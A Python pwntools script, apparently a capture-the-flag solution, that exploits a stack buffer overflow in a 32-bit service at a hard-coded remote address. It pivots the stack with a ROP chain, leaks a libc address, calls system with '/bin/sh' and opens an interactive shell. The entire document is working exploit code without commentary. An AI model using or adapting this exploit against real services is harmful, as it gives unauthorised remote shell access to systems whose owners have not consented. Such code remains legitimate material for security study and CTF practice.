from pwn import *
gadget1 = 0x08048578 # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
#s = remote('192.168.32.236',1234)
s = remote('121.170.91.18', 6932)
raw_input()
s.recvuntil(':')
dat = "A"*0x28
dat += p32(0x0804A200+0x800)
dat += p32(0x08048380)
dat += p32(0x08048510)
dat += p32(0x0)
dat += p32(0x0804A200+0x4+0x800)
dat += p32(0x100)
time.sleep(0.3)
s.send(dat)
dat = p32(0x08048390)
dat += p32(gadget1+3)
dat += p32(0x08049FE8)
dat += p32(0x08048380)
dat += p32(gadget1+1)
dat += p32(0x0)
dat += p32(0x0804A200+0x4+len(dat)+4+4+0x800)
dat += p32(0x100)
s.send(dat)
libc = u32(s.recvuntil('\xf7')[-4:]) - 0xd4350
log.info("LIBC : 0x%x"%libc)
dat = p32(libc+0x3a940)
dat += p32(0)
dat += p32(0x804a22c+0x800+0x4)
dat += '/bin/sh'
time.sleep(0.3)
s.send(dat)
s.interactive()
